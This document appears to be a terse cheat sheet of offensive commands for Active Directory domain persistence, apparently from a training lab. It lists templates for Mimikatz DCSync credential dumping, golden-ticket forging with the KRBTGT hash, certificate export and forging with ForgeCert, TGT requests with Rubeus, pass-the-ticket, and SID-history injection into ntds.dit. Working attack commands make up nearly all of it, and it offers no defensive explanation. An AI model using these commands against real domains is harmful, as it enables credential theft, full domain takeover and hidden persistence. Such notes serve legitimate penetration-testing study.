# References

# Notes

# Commands
SSH
~~~
ssh za\\<uname>@<fqdn>
~~~

Mimikatz - DCSync
~~~
mimikatz # lsadump::dcsync /domain:<fqdn> /user:<Uname>
mimikatz # lsadump::dcsync /domain:<fqdn> /all
~~~

Mimikatz - Golden Ticket
~~~
mimikatz # kerberos::golden /admin:<account> /domain:<fqdn> /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
~~~

Mimikatz View Certs & export
~~~
mimikatz # crypto::certificates /systemstore:local_machine
mimikatz # crypto::certificates /systemstore:local_machine /export
~~~


Validate Golden Ticket 
~~~
ssh shell shell path>dir \\<fqdn>\c$\
~~~

Generate New Certs with ForgeCerts
~~~
>C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath <file>.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName <uname>@<domain> --NewCertPath <filename>.pfx --NewCertPassword <passwordd>
~~~

Rubeus request a TGT 
~~~
C:\Tools\Rubeus.exe asktgt /user:<uname> /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:<fqdn> /dc:<IP of domain controller>
~~~


Mimikatz Load the TGT
~~~
mimikatz # kerberos::ptt administrator.kirbi
~~~

Domain Enum
~~~
Get-ADDomain
Get-ADGroupMember -Identity "Domain Admins"
~~~

DSInternals Patch NTDS.dit file
~~~
> Stop-Service -Name ntds -force
> Add-ADDBSidHistory -SamAccountName '<username AD account>' -SidHistory '<sid to add>' -DatabasePath C:\Windows\NTDS\ntds.dit
> Start-Service -Name ntds
~~~

SDprop
~~~
Invoke-ADSDPropagation
~~~